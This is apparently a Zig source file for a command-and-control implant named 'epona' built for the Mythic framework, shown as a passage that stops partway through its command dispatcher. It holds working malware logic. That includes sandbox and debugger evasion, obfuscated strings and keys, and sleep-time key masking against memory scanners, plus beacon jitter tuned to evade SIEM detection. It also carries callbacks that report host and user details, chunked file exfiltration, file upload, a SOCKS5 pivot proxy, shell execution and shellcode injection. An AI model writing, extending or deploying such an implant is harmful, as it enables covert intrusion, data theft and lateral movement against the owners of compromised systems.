const std     = @import("std");
const builtin = @import("builtin");
const config  = @import("config");
const mqtt    = @import("mqtt.zig");
const httpc   = @import("http.zig");
const crypto  = @import("crypto.zig");
const cmds    = @import("commands.zig");
const lsc     = @import("linux_syscalls.zig");
const win     = @import("syscalls.zig");
const ob      = @import("obfuscate.zig");
comptime { _ = @import("decoys.zig"); }

pub var g_shutdown = std.atomic.Value(bool).init(false);

// ---------------------------------------------------------------------------
// Anti-sandbox: exits silently if environment looks like an automated sandbox.
// Checks uptime < 5 min, /proc process count < 50.
// ---------------------------------------------------------------------------

fn looksLikeSandbox() bool {
    if (comptime builtin.os.tag != .linux) return false;

    // Uptime < 5 minutes
    {
        const f = std.fs.openFileAbsolute("/proc/uptime", .{}) catch return false;
        defer f.close();
        var buf: [64]u8 = undefined;
        const n = f.read(&buf) catch return false;
        const s = std.mem.trim(u8, buf[0..n], " \t\n\r");
        const dot = std.mem.indexOf(u8, s, ".") orelse s.len;
        const secs = std.fmt.parseInt(u64, s[0..dot], 10) catch 0;
        if (secs < 300) return true;
    }

    // /proc process count < 50
    {
        var dir = std.fs.openDirAbsolute("/proc", .{ .iterate = true }) catch return false;
        defer dir.close();
        var count: u32 = 0;
        var iter = dir.iterate();
        while (iter.next() catch null) |entry| {
            if (entry.kind == .directory) {
                if (std.fmt.parseInt(u32, entry.name, 10)) |_| {
                    count += 1;
                } else |_| {}
            }
        }
        if (count < 50) return true;
    }

    return false;
}

inline fn dbg(comptime fmt: []const u8, args: anytype) void {
    if (comptime builtin.mode == .Debug) {
        std.debug.print("[epona] " ++ fmt ++ "\n", args);
    }
}

const UUID_LEN = 36;

// ---------------------------------------------------------------------------
// Task / Tasking types
// ---------------------------------------------------------------------------

const Task = struct {
    id:         []u8,
    command:    []u8,
    parameters: []u8,
};

const SocksItem = struct {
    server_id: u32,
    data:      []const u8,
    exit:      bool,
};

const Tasking = struct {
    tasks: []Task,
    socks: []SocksItem,
};

// ---------------------------------------------------------------------------
// Background-job system
// ---------------------------------------------------------------------------

const JobState = enum(u8) { running, done };

const Job = struct {
    id:      u32,
    task_id: []const u8,   // owned; freed when job removed from list
    command: []const u8,   // owned; freed when job removed
    cancel:  std.atomic.Value(bool),
    state:   std.atomic.Value(JobState),
};

const JobCtx = struct {
    agent:  *Agent,
    job:    *Job,
    params: []u8,          // owned; freed by thread on exit
};

// A completed background task waiting to be posted
const PendingResult = struct {
    task_id:  []const u8,  // owned by Agent.allocator
    output:   []const u8,  // owned by Agent.allocator
    is_error: bool,
};

// ---------------------------------------------------------------------------
// SOCKS5 proxy state
// ---------------------------------------------------------------------------

const SocksConnState = enum { handshake, connecting, connected, closing };

const SocksConn = struct {
    state:    SocksConnState,
    stream:   ?std.net.Stream,
    in_buf:   std.ArrayList(u8),
    out_buf:  std.ArrayList(u8),
    alloc:    std.mem.Allocator,

    fn deinit(self: *SocksConn) void {
        if (self.stream) |s| s.close();
        self.in_buf.deinit();
        self.out_buf.deinit();
    }
};

// ---------------------------------------------------------------------------
// Agent
// ---------------------------------------------------------------------------

pub const Agent = struct {
    allocator:     std.mem.Allocator,
    payload_uuid:  []const u8,
    callback_uuid: []u8,
    sleep_ms:      u64,
    jitter_pct:    u32,
    cwd:           []u8,
    enc_key:       ?[32]u8,
    dec_key:       ?[32]u8,

    // Background jobs
    jobs:          std.ArrayList(*Job),
    jobs_mutex:    std.Thread.Mutex,
    next_job_id:   u32,
    pending:       std.ArrayList(PendingResult),
    pending_mutex: std.Thread.Mutex,

    // SOCKS5 connections
    socks_conns:   std.AutoHashMap(u32, *SocksConn),

    pub fn init(allocator: std.mem.Allocator) !Agent {
        const cwd = try std.process.getCwdAlloc(allocator);

        var enc_key: ?[32]u8 = null;
        var dec_key: ?[32]u8 = null;
        if (comptime !std.mem.eql(u8, config.crypto_type, "none")) {
            if (config.enc_key.len > 0) enc_key = try crypto.decodeKey(config.enc_key);
            if (config.dec_key.len > 0) dec_key = try crypto.decodeKey(config.dec_key);
        }

        return .{
            .allocator     = allocator,
            .payload_uuid  = config.payload_uuid,
            .callback_uuid = try allocator.dupe(u8, ""),
            .sleep_ms      = @as(u64, config.callback_interval) * std.time.ms_per_s,
            .jitter_pct    = config.callback_jitter,
            .cwd           = cwd,
            .enc_key       = enc_key,
            .dec_key       = dec_key,
            .jobs          = std.ArrayList(*Job).init(allocator),
            .jobs_mutex    = .{},
            .next_job_id   = 1,
            .pending       = std.ArrayList(PendingResult).init(allocator),
            .pending_mutex = .{},
            .socks_conns   = std.AutoHashMap(u32, *SocksConn).init(allocator),
        };
    }

    pub fn deinit(self: *Agent) void {
        self.allocator.free(self.callback_uuid);
        self.allocator.free(self.cwd);

        self.jobs_mutex.lock();
        for (self.jobs.items) |job| {
            self.allocator.free(job.task_id);
            self.allocator.free(job.command);
            self.allocator.destroy(job);
        }
        self.jobs.deinit();
        self.jobs_mutex.unlock();

        self.pending_mutex.lock();
        for (self.pending.items) |p| {
            self.allocator.free(p.task_id);
            self.allocator.free(p.output);
        }
        self.pending.deinit();
        self.pending_mutex.unlock();

        var sc_iter = self.socks_conns.iterator();
        while (sc_iter.next()) |entry| {
            entry.value_ptr.*.deinit();
            self.allocator.destroy(entry.value_ptr.*);
        }
        self.socks_conns.deinit();
    }

    // -----------------------------------------------------------------------
    // Main loop
    // -----------------------------------------------------------------------

    pub fn run(self: *Agent) !void {
        // Anti-sandbox: exit silently in automated analysis environments
        if (looksLikeSandbox()) std.process.exit(0);

        // Anti-debug (Linux): PTRACE_TRACEME returns non-zero if already traced
        if (comptime builtin.os.tag == .linux) {
            if (lsc.ptraceTraceme() != 0) std.process.exit(0);
        }

        // Check-in loop
        while (!g_shutdown.load(.acquire)) {
            if (self.passedKillDate()) std.process.exit(0);
            dbg("attempting checkin...", .{});
            if (self.checkin() catch |e| blk: {
                dbg("checkin failed: {s}", .{@errorName(e)});
                break :blk false;
            }) break;
            self.doSleep();
        }
        if (g_shutdown.load(.acquire)) return;
        dbg("checkin ok, uuid={s}", .{self.callback_uuid});

        // Tasking loop
        while (!g_shutdown.load(.acquire)) {
            if (self.passedKillDate()) std.process.exit(0);

            var arena = std.heap.ArenaAllocator.init(self.allocator);
            defer arena.deinit();
            const aa = arena.allocator();

            const tasking = self.getTasking(aa) catch |e| {
                dbg("get_tasking failed: {s}", .{@errorName(e)});
                self.doSleep();
                continue;
            };

            // Process incoming SOCKS data
            for (tasking.socks) |item| self.processSocksItem(item);

            // Poll all SOCKS connections for TCP→Mythic data
            self.pollSocksConnections();

            // Drain pending job results
            const pending_snap = self.drainPending(aa);

            // Collect SOCKS outgoing data
            var socks_out_json = std.ArrayList(u8).init(aa);
            try self.buildSocksOutJson(aa, &socks_out_json);

            const has_work = tasking.tasks.len > 0 or
                             pending_snap.len > 0 or
                             socks_out_json.items.len > 2; // "[]" is 2 chars

            if (has_work) {
                self.processAll(aa, tasking.tasks, pending_snap, socks_out_json.items) catch {};
            }

            // Clean up done jobs
            self.cleanupDoneJobs();

            self.doSleep();
        }
    }

    // -----------------------------------------------------------------------
    // Job helpers
    // -----------------------------------------------------------------------

    fn spawnJob(self: *Agent, task_id: []const u8, command: []const u8, params: []const u8) !u32 {
        const job = try self.allocator.create(Job);
        job.* = .{
            .id      = self.next_job_id,
            .task_id = try self.allocator.dupe(u8, task_id),
            .command = try self.allocator.dupe(u8, command),
            .cancel  = std.atomic.Value(bool).init(false),
            .state   = std.atomic.Value(JobState).init(.running),
        };
        self.next_job_id += 1;

        const ctx = try self.allocator.create(JobCtx);
        ctx.* = .{ .agent = self, .job = job, .params = try self.allocator.dupe(u8, params) };

        self.jobs_mutex.lock();
        try self.jobs.append(job);
        self.jobs_mutex.unlock();

        const t = try std.Thread.spawn(.{}, portscanJobThread, .{ctx});
        t.detach();

        return job.id;
    }

    fn cleanupDoneJobs(self: *Agent) void {
        self.jobs_mutex.lock();
        defer self.jobs_mutex.unlock();
        var i: usize = 0;
        while (i < self.jobs.items.len) {
            const job = self.jobs.items[i];
            if (job.state.load(.acquire) == .done) {
                self.allocator.free(job.task_id);
                self.allocator.free(job.command);
                self.allocator.destroy(job);
                _ = self.jobs.swapRemove(i);
            } else {
                i += 1;
            }
        }
    }

    fn drainPending(self: *Agent, aa: std.mem.Allocator) []PendingResult {
        self.pending_mutex.lock();
        defer self.pending_mutex.unlock();
        if (self.pending.items.len == 0) return &[_]PendingResult{};
        const snap = aa.dupe(PendingResult, self.pending.items) catch return &[_]PendingResult{};
        // free the long-lived strings after copying to arena
        for (self.pending.items) |_| {} // caller owns the strings in the snap copies
        self.pending.clearRetainingCapacity();
        return snap;
    }

    fn addPending(self: *Agent, task_id: []const u8, output: []const u8, is_error: bool) void {
        const tid = self.allocator.dupe(u8, task_id) catch return;
        const out = self.allocator.dupe(u8, output) catch { self.allocator.free(tid); return; };
        self.pending_mutex.lock();
        self.pending.append(.{ .task_id = tid, .output = out, .is_error = is_error }) catch {
            self.allocator.free(tid);
            self.allocator.free(out);
        };
        self.pending_mutex.unlock();
    }

    fn listJobsCmd(self: *Agent, aa: std.mem.Allocator) ![]u8 {
        self.jobs_mutex.lock();
        defer self.jobs_mutex.unlock();
        if (self.jobs.items.len == 0) return aa.dupe(u8, "no running jobs");
        var buf = std.ArrayList(u8).init(aa);
        try buf.appendSlice("ID   COMMAND    TASK_ID\n");
        for (self.jobs.items) |job| {
            try buf.writer().print("{d:<4} {s:<10} {s}\n", .{ job.id, job.command, job.task_id });
        }
        return buf.toOwnedSlice();
    }

    fn killJobCmd(self: *Agent, aa: std.mem.Allocator, params_json: []const u8) ![]u8 {
        const P = struct { id: u32 };
        const parsed = try std.json.parseFromSlice(P, aa, params_json, .{ .ignore_unknown_fields = true });
        const job_id = parsed.value.id;

        self.jobs_mutex.lock();
        defer self.jobs_mutex.unlock();
        for (self.jobs.items) |job| {
            if (job.id == job_id) {
                job.cancel.store(true, .release);
                return std.fmt.allocPrint(aa, "cancel sent to job {d}", .{job_id});
            }
        }
        return std.fmt.allocPrint(aa, "job {d} not found", .{job_id});
    }

    // -----------------------------------------------------------------------
    // SOCKS5 proxy
    // -----------------------------------------------------------------------

    fn processSocksItem(self: *Agent, item: SocksItem) void {
        if (item.exit) {
            if (self.socks_conns.getPtr(item.server_id)) |conn_ptr| {
                conn_ptr.*.deinit();
                self.allocator.destroy(conn_ptr.*);
                _ = self.socks_conns.remove(item.server_id);
            }
            return;
        }

        const conn_ptr = self.socks_conns.getPtr(item.server_id) orelse blk: {
            const c = self.allocator.create(SocksConn) catch return;
            c.* = .{
                .state   = .handshake,
                .stream  = null,
                .in_buf  = std.ArrayList(u8).init(self.allocator),
                .out_buf = std.ArrayList(u8).init(self.allocator),
                .alloc   = self.allocator,
            };
            self.socks_conns.put(item.server_id, c) catch {
                c.deinit();
                self.allocator.destroy(c);
                return;
            };
            break :blk self.socks_conns.getPtr(item.server_id).?;
        };
        self.advanceSocks5(conn_ptr.*, item.data);
    }

    fn advanceSocks5(self: *Agent, conn: *SocksConn, data: []const u8) void {
        _ = self;
        conn.in_buf.appendSlice(data) catch return;
        while (true) {
            switch (conn.state) {
                .handshake => {
                    const buf = conn.in_buf.items;
                    if (buf.len < 2) return;
                    const nmethods = buf[1];
                    if (buf.len < 2 + @as(usize, nmethods)) return;
                    conn.out_buf.appendSlice(&[_]u8{ 0x05, 0x00 }) catch return;
                    shiftBuf(&conn.in_buf, 2 + nmethods);
                    conn.state = .connecting;
                },
                .connecting => {
                    const buf = conn.in_buf.items;
                    if (buf.len < 4) return;
                    if (buf[0] != 0x05 or buf[1] != 0x01) {
                        conn.out_buf.appendSlice(&[_]u8{ 0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }) catch {};
                        conn.state = .closing;
                        return;
                    }
                    const atyp = buf[3];
                    var host_buf: [256]u8 = undefined;
                    var host: []const u8 = undefined;
                    var port: u16 = undefined;
                    var req_len: usize = undefined;

                    switch (atyp) {
                        0x01 => {
                            if (buf.len < 10) return;
                            host = std.fmt.bufPrint(&host_buf, "{d}.{d}.{d}.{d}", .{ buf[4], buf[5], buf[6], buf[7] }) catch return;
                            port = (@as(u16, buf[8]) << 8) | buf[9];
                            req_len = 10;
                        },
                        0x03 => {
                            if (buf.len < 5) return;
                            const dlen: usize = buf[4];
                            if (buf.len < 5 + dlen + 2) return;
                            @memcpy(host_buf[0..dlen], buf[5..][0..dlen]);
                            host = host_buf[0..dlen];
                            port = (@as(u16, buf[5 + dlen]) << 8) | buf[5 + dlen + 1];
                            req_len = 5 + dlen + 2;
                        },
                        else => {
                            conn.out_buf.appendSlice(&[_]u8{ 0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }) catch {};
                            conn.state = .closing;
                            return;
                        },
                    }

                    const stream = std.net.tcpConnectToHost(conn.alloc, host, port) catch {
                        conn.out_buf.appendSlice(&[_]u8{ 0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }) catch {};
                        conn.state = .closing;
                        return;
                    };
                    conn.stream = stream;
                    conn.out_buf.appendSlice(&[_]u8{ 0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }) catch {};
                    shiftBuf(&conn.in_buf, req_len);
                    conn.state = .connected;
                },
                .connected => {
                    if (conn.in_buf.items.len == 0) return;
                    if (conn.stream) |stream| {
                        stream.writeAll(conn.in_buf.items) catch {
                            conn.state = .closing;
                            return;
                        };
                        conn.in_buf.clearRetainingCapacity();
                    }
                    return;
                },
                .closing => return,
            }
        }
    }

    fn pollSocksConnections(self: *Agent) void {
        var iter = self.socks_conns.valueIterator();
        while (iter.next()) |conn_ptr| {
            const conn = conn_ptr.*;
            if (conn.state != .connected) continue;
            const stream = conn.stream orelse continue;

            var pfd = [1]std.posix.pollfd{.{
                .fd      = stream.handle,
                .events  = std.posix.POLL.IN | std.posix.POLL.HUP,
                .revents = 0,
            }};
            const n = std.posix.poll(&pfd, 0) catch continue;
            if (n == 0) continue;
            if (pfd[0].revents & std.posix.POLL.HUP != 0) { conn.state = .closing; continue; }
            if (pfd[0].revents & std.posix.POLL.IN != 0) {
                var tmp: [4096]u8 = undefined;
                const rn = stream.read(&tmp) catch { conn.state = .closing; continue; };
                if (rn == 0) { conn.state = .closing; continue; }
                conn.out_buf.appendSlice(tmp[0..rn]) catch {};
            }
        }
    }

    fn buildSocksOutJson(self: *Agent, aa: std.mem.Allocator, out: *std.ArrayList(u8)) !void {
        try out.append('[');
        var first = true;
        var to_remove = std.ArrayList(u32).init(aa);
        var iter = self.socks_conns.iterator();
        while (iter.next()) |entry| {
            const server_id = entry.key_ptr.*;
            const conn = entry.value_ptr.*;
            const should_exit = conn.state == .closing;
            if (conn.out_buf.items.len == 0 and !should_exit) continue;

            const b64_len = std.base64.standard.Encoder.calcSize(conn.out_buf.items.len);
            const b64 = try aa.alloc(u8, b64_len);
            _ = std.base64.standard.Encoder.encode(b64, conn.out_buf.items);
            conn.out_buf.clearRetainingCapacity();

            if (!first) try out.append(',');
            first = false;
            try out.writer().print(
                \\{{"server_id":{d},"data":"{s}","exit":{s}}}
            , .{ server_id, b64, if (should_exit) "true" else "false" });

            if (should_exit) try to_remove.append(server_id);
        }
        try out.append(']');

        for (to_remove.items) |sid| {
            if (self.socks_conns.fetchRemove(sid)) |kv| {
                kv.value.deinit();
                self.allocator.destroy(kv.value);
            }
        }
    }

    // -----------------------------------------------------------------------
    // Download (chunked Mythic file exfil)
    // -----------------------------------------------------------------------

    fn downloadCmd(self: *Agent, aa: std.mem.Allocator, task_id: []const u8, path: []const u8) ![]u8 {
        const CHUNK = 512 * 1024;

        const file = std.fs.cwd().openFile(path, .{}) catch |e| {
            return std.fmt.allocPrint(aa, "download: {s}: {s}", .{ path, @errorName(e) });
        };
        defer file.close();

        const file_size = (file.stat() catch return aa.dupe(u8, "download: stat failed")).size;
        const total_chunks: u32 = @intCast(if (file_size == 0) 1 else (file_size + CHUNK - 1) / CHUNK);

        const chunk_buf = try aa.alloc(u8, CHUNK);
        var chunk_num: u32 = 1;
        var file_id: []const u8 = "";

        while (true) {
            const nr = file.read(chunk_buf) catch break;
            const chunk = chunk_buf[0..nr];

            const b64_size = std.base64.standard.Encoder.calcSize(chunk.len);
            const b64 = try aa.alloc(u8, b64_size);
            _ = std.base64.standard.Encoder.encode(b64, chunk);

            const is_last = chunk_num == total_chunks or nr == 0;

            const json = if (file_id.len == 0) blk: {
                const path_esc = try jsonEscape(aa, path);
                break :blk try std.fmt.allocPrint(aa,
                    \\{{"action":"post_response","responses":[{{"task_id":"{s}","completed":{s},"download":{{"total_chunks":{d},"chunk_num":{d},"chunk_data":"{s}","full_path":"{s}","is_screenshot":false,"host":""}}}}]}}
                , .{ task_id, if (is_last) "true" else "false", total_chunks, chunk_num, b64, path_esc });
            } else blk: {
                break :blk try std.fmt.allocPrint(aa,
                    \\{{"action":"post_response","responses":[{{"task_id":"{s}","completed":{s},"download":{{"file_id":"{s}","chunk_num":{d},"chunk_data":"{s}"}}}}]}}
                , .{ task_id, if (is_last) "true" else "false", file_id, chunk_num, b64 });
            };

            const msg  = try self.formatMessage(aa, self.callback_uuid, json);
            const resp = try self.makeRequest(aa, msg);

            // Parse file_id from first response
            if (file_id.len == 0) {
                if (std.mem.indexOf(u8, resp, "\"file_id\"")) |kp| {
                    const after_colon = std.mem.indexOfPos(u8, resp, kp, ":\"") orelse continue;
                    const vs = after_colon + 2;
                    const ve = std.mem.indexOfPos(u8, resp, vs, "\"") orelse continue;
                    file_id = try aa.dupe(u8, resp[vs..ve]);
                }
            }

            if (is_last or nr == 0) break;
            chunk_num += 1;
        }

        return std.fmt.allocPrint(aa, "downloaded {s} ({d} bytes)", .{ path, file_size });
    }

    // -----------------------------------------------------------------------
    // Upload (chunked Mythic file delivery)
    // -----------------------------------------------------------------------

    fn uploadCmd(self: *Agent, aa: std.mem.Allocator, task_id: []const u8, file_id: []const u8, path: []const u8) ![]u8 {
        const CHUNK_SIZE: u32 = 512 * 1024;

        const file = std.fs.cwd().createFile(path, .{ .truncate = true }) catch |e| {
            return std.fmt.allocPrint(aa, "upload: {s}: {s}", .{ path, @errorName(e) });
        };
        defer file.close();

        var chunk_num: u32 = 1;
        var total_chunks: u32 = 0;
        var bytes_written: u64 = 0;

        while (true) {
            const path_esc = try jsonEscape(aa, path);
            const json = try std.fmt.allocPrint(aa,
                \\{{"action":"post_response","responses":[{{"task_id":"{s}","upload":{{"chunk_num":{d},"chunk_size":{d},"file_id":"{s}","full_path":"{s}"}}}}]}}
            , .{ task_id, chunk_num, CHUNK_SIZE, file_id, path_esc });

            const msg  = try self.formatMessage(aa, self.callback_uuid, json);
            const resp = try self.makeRequest(aa, msg);

            // Parse chunk_data, total_chunks
            const chunk_data_b64 = extractJsonStr(aa, resp, "\"chunk_data\"") orelse break;
            if (total_chunks == 0) {
                const tc_str = extractNumericField(resp, "\"total_chunks\"");
                total_chunks = std.fmt.parseInt(u32, tc_str, 10) catch 1;
            }

            // Decode and write
            const raw_len = std.base64.standard.Decoder.calcSizeForSlice(chunk_data_b64) catch break;
            const raw = try aa.alloc(u8, raw_len);
            std.base64.standard.Decoder.decode(raw, chunk_data_b64) catch break;
            file.writeAll(raw) catch break;
            bytes_written += raw.len;

            if (chunk_num >= total_chunks) break;
            chunk_num += 1;
        }

        return std.fmt.allocPrint(aa, "uploaded to {s} ({d} bytes)", .{ path, bytes_written });
    }

    // -----------------------------------------------------------------------
    // Kill date / sleep
    // -----------------------------------------------------------------------

    fn passedKillDate(self: *Agent) bool {
        _ = self;
        const now: u64 = @intCast(@max(0, std.time.timestamp()));
        return now >= config.kill_timestamp;
    }

    fn doSleep(self: *Agent) void {
        // Uniform cryptographic jitter over [base - jitter%, base + jitter%].
        // Replaces the previous bimodal "10% chance to double" distribution
        // which SIEM beacon-detection analytics flag statistically.
        var ms = self.sleep_ms;
        if (self.jitter_pct > 0 and ms > 0) {
            const range = ms * @as(u64, self.jitter_pct) / 100;
            const min_ms = if (ms > range) ms - range else 0;
            const span = 2 * range + 1;
            ms = min_ms + std.crypto.random.int(u64) % span;
        }

        // Sleep obfuscation: XOR enc/dec keys with ephemeral key during sleep.
        // Memory scanners scanning the process during sleep see garbage, not AES keys.
        var ephemeral: [32]u8 = undefined;
        std.crypto.random.bytes(&ephemeral);
        defer @memset(&ephemeral, 0);

        if (self.enc_key) |*k| { for (k, ephemeral) |*b, e| b.* ^= e; }
        if (self.dec_key) |*k| { for (k, ephemeral) |*b, e| b.* ^= e; }

        const chunk: u64 = 100;
        var remaining: u64 = ms;
        while (remaining > 0 and !g_shutdown.load(.acquire)) {
            const slice: u64 = @min(remaining, chunk);
            std.time.sleep(slice * std.time.ns_per_ms);
            remaining -= slice;
        }

        // Restore keys after sleep
        if (self.enc_key) |*k| { for (k, ephemeral) |*b, e| b.* ^= e; }
        if (self.dec_key) |*k| { for (k, ephemeral) |*b, e| b.* ^= e; }
    }

    // -----------------------------------------------------------------------
    // Check-in
    // -----------------------------------------------------------------------

    fn checkin(self: *Agent) !bool {
        var arena = std.heap.ArenaAllocator.init(self.allocator);
        defer arena.deinit();
        const aa = arena.allocator();

        const hostname = self.getHostname(aa);
        const username = self.getUsername(aa);
        const ip       = self.getIp(aa, hostname);
        const os_str   = self.getOs(aa);
        const arch     = if (@sizeOf(usize) >= 8) "x64" else "x86";
        const pid: i64 = switch (comptime @import("builtin").os.tag) {
            .windows => @intCast(std.os.windows.GetCurrentProcessId()),
            .linux   => std.os.linux.getpid(),
            else     => 0,
        };

        // Decode sensitive strings at runtime — not in .rodata as plaintext.
        var uuid_buf: [ob.e_uuid.len]u8 = undefined;
        ob.e_uuid.dec(&uuid_buf);
        defer @memset(&uuid_buf, 0);

        var enc_key_buf: [ob.e_enc_key_b64.len]u8 = undefined;
        ob.e_enc_key_b64.dec(&enc_key_buf);
        defer @memset(&enc_key_buf, 0);

        var dec_key_buf: [ob.e_dec_key_b64.len]u8 = undefined;
        ob.e_dec_key_b64.dec(&dec_key_buf);
        defer @memset(&dec_key_buf, 0);

        const checkin_json = try std.fmt.allocPrint(aa,
            \\{{"action":"checkin","ip":"{s}","os":"{s}","user":"{s}","host":"{s}","domain":"{s}","pid":{d},"uuid":"{s}","architecture":"{s}","encryption_key":"{s}","decryption_key":"{s}"}}
        , .{
            ip, os_str, username, hostname, hostname,
            pid, &uuid_buf, arch,
            &enc_key_buf, &dec_key_buf,
        });

        const message  = try self.formatMessage(aa, self.payload_uuid, checkin_json);
        const raw_resp = try self.makeRequest(aa, message);
        const json_resp = try self.parseResponse(aa, self.payload_uuid, raw_resp);
        if (std.mem.indexOf(u8, json_resp, "\"id\"") == null) return false;

        const id_start = (std.mem.indexOf(u8, json_resp, "\"id\":\"") orelse return false) + 6;
        const id_end   = std.mem.indexOfPos(u8, json_resp, id_start, "\"") orelse return false;
        const new_uuid = json_resp[id_start..id_end];

        self.allocator.free(self.callback_uuid);
        self.callback_uuid = try self.allocator.dupe(u8, new_uuid);
        return true;
    }

    // -----------------------------------------------------------------------
    // Get tasking
    // -----------------------------------------------------------------------

    fn getTasking(self: *Agent, aa: std.mem.Allocator) !Tasking {
        const req  = "{\"action\":\"get_tasking\",\"tasking_size\":-1}";
        const msg  = try self.formatMessage(aa, self.callback_uuid, req);
        const raw  = try self.makeRequest(aa, msg);
        const json = try self.parseResponse(aa, self.callback_uuid, raw);

        return .{
            .tasks = try parseTaskArray(aa, json),
            .socks = try parseSocksArray(aa, json),
        };
    }

    fn parseTaskArray(aa: std.mem.Allocator, json: []const u8) ![]Task {
        const kw        = std.mem.indexOf(u8, json, "\"tasks\"") orelse return &[_]Task{};
        const arr_start = std.mem.indexOfPos(u8, json, kw, "[") orelse return &[_]Task{};
        const arr_end   = std.mem.indexOfPos(u8, json, arr_start, "]") orelse return &[_]Task{};
        const arr       = json[arr_start + 1 .. arr_end];
        if (std.mem.trim(u8, arr, " \t\r\n").len == 0) return &[_]Task{};

        var list = std.ArrayList(Task).init(aa);
        var pos: usize = 0;
        while (pos < arr.len) {
            const os = std.mem.indexOfPos(u8, arr, pos, "{") orelse break;
            const oe = findObjEnd(arr, os) orelse break;
            const obj = arr[os .. oe + 1];
            pos = oe + 1;

            const id     = extractJsonStr(aa, obj, "\"id\"")        orelse continue;
            const cmd    = extractJsonStr(aa, obj, "\"command\"")    orelse continue;
            const params = extractJsonStr(aa, obj, "\"parameters\"") orelse try aa.dupe(u8, "{}");
            try list.append(.{ .id = id, .command = cmd, .parameters = params });
        }
        return list.toOwnedSlice();
    }

    fn parseSocksArray(aa: std.mem.Allocator, json: []const u8) ![]SocksItem {
        const kw        = std.mem.indexOf(u8, json, "\"socks\"") orelse return &[_]SocksItem{};
        const arr_start = std.mem.indexOfPos(u8, json, kw, "[") orelse return &[_]SocksItem{};
        const arr_end   = std.mem.indexOfPos(u8, json, arr_start, "]") orelse return &[_]SocksItem{};
        const arr       = json[arr_start + 1 .. arr_end];
        if (std.mem.trim(u8, arr, " \t\r\n").len == 0) return &[_]SocksItem{};

        var list = std.ArrayList(SocksItem).init(aa);
        var pos: usize = 0;
        while (pos < arr.len) {
            const os = std.mem.indexOfPos(u8, arr, pos, "{") orelse break;
            const oe = findObjEnd(arr, os) orelse break;
            const obj = arr[os .. oe + 1];
            pos = oe + 1;

            // server_id (integer)
            const server_id: u32 = blk: {
                const key = "\"server_id\"";
                const kp = std.mem.indexOf(u8, obj, key) orelse break :blk 0;
                const cp = std.mem.indexOfPos(u8, obj, kp + key.len, ":") orelse break :blk 0;
                var ns = cp + 1;
                while (ns < obj.len and obj[ns] == ' ') ns += 1;
                var ne = ns;
                while (ne < obj.len and obj[ne] >= '0' and obj[ne] <= '9') ne += 1;
                break :blk std.fmt.parseInt(u32, obj[ns..ne], 10) catch 0;
            };

            // data (base64 string → decoded bytes)
            const b64 = extractJsonStr(aa, obj, "\"data\"") orelse try aa.dupe(u8, "");
            const dec_len = std.base64.standard.Decoder.calcSizeForSlice(b64) catch 0;
            const decoded = try aa.alloc(u8, dec_len);
            std.base64.standard.Decoder.decode(decoded, b64) catch {};

            // exit (boolean)
            const exit: bool = blk: {
                const key = "\"exit\"";
                const kp = std.mem.indexOf(u8, obj, key) orelse break :blk false;
                const cp = std.mem.indexOfPos(u8, obj, kp + key.len, ":") orelse break :blk false;
                const rest = std.mem.trim(u8, obj[cp + 1..], " \t");
                break :blk std.mem.startsWith(u8, rest, "true");
            };

            try list.append(.{ .server_id = server_id, .data = decoded, .exit = exit });
        }
        return list.toOwnedSlice();
    }

    // -----------------------------------------------------------------------
    // Process tasks + pending + socks
    // -----------------------------------------------------------------------

    fn processAll(
        self:        *Agent,
        aa:          std.mem.Allocator,
        tasks:       []Task,
        pending:     []PendingResult,
        socks_json:  []const u8,
    ) !void {
        var responses = std.ArrayList(u8).init(aa);
        try responses.appendSlice("{\"action\":\"post_response\",\"responses\":[");

        var first = true;

        // Execute new tasks
        for (tasks) |task| {
            if (!first) try responses.append(',');
            first = false;

            var is_error = false;
            const output = self.executeTask(aa, task, &is_error) catch |e| blk: {
                is_error = true;
                break :blk std.fmt.allocPrint(aa, "error: {s}", .{@errorName(e)}) catch "error";
            };

            const escaped = try jsonEscape(aa, output);
            const status  = if (is_error) "error" else "success";
            try responses.writer().print(
                \\{{"task_id":"{s}","user_output":"{s}","completed":true,"status":"{s}"}}
            , .{ task.id, escaped, status });
        }

        // Append completed background job results
        for (pending) |p| {
            if (!first) try responses.append(',');
            first = false;
            const escaped = try jsonEscape(aa, p.output);
            const status  = if (p.is_error) "error" else "success";
            try responses.writer().print(
                \\{{"task_id":"{s}","user_output":"{s}","completed":true,"status":"{s}"}}
            , .{ p.task_id, escaped, status });
            // free long-lived strings
            self.allocator.free(p.task_id);
            self.allocator.free(p.output);
        }

        try responses.appendSlice("]");

        // Append socks data if any
        const has_socks = !std.mem.eql(u8, socks_json, "[]");
        if (has_socks) {
            try responses.appendSlice(",\"socks\":");
            try responses.appendSlice(socks_json);
        }

        try responses.append('}');

        if (tasks.len > 0 or pending.len > 0 or has_socks) {
            const message = try self.formatMessage(aa, self.callback_uuid, responses.items);
            _ = try self.makeRequest(aa, message);
        }
    }

    fn executeTask(self: *Agent, aa: std.mem.Allocator, task: Task, is_error: *bool) ![]u8 {
        const cmd = task.command;
        const p   = task.parameters;

        switch (ob.hashRuntime(cmd)) {
            ob.cmdHash("shell") => {
                const r = try cmds.shell(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("exit")  => std.process.exit(0),
            ob.cmdHash("sleep") => return self.sleepCmd(aa, p),
            ob.cmdHash("ls") => {
                const r = try cmds.ls(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("cd") => {
                const r = try cmds.cd(aa, p, &self.cwd);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("pwd") => {
                const r = try cmds.pwd(aa);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("env") => {
                const r = try cmds.env(aa);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("ps") => {
                const r = try cmds.ps(aa);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("kill") => {
                const r = try cmds.kill(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("netstat") => {
                const r = try cmds.netstat(aa);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("cron") => {
                const r = try cmds.cron(aa);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("shinject") => {
                const r = try cmds.shinject(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("jobs")    => if (comptime config.include_jobs) return self.listJobsCmd(aa) else return aa.dupe(u8, ""),
